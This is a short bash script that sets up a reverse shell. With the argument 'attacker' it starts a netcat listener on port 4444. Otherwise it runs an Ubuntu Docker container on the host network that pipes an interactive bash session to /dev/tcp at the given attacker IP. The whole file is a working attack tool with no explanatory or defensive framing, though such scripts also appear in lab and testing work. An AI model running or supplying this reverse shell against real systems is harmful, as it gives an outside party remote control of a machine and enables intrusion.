#!/usr/bin/env bash
set -e

if [ -z "$1" ]; then
  echo "Usage: $0 <attacker-ip>"
  exit 1
fi

if [[ $1 = 'attacker' ]]; then
  echo "starting listener on port 4444"
  nc -lvp 4444
fi

docker run --network host -it ubuntu bash -c "/bin/bash -i >& /dev/tcp/$1/4444 0>&1"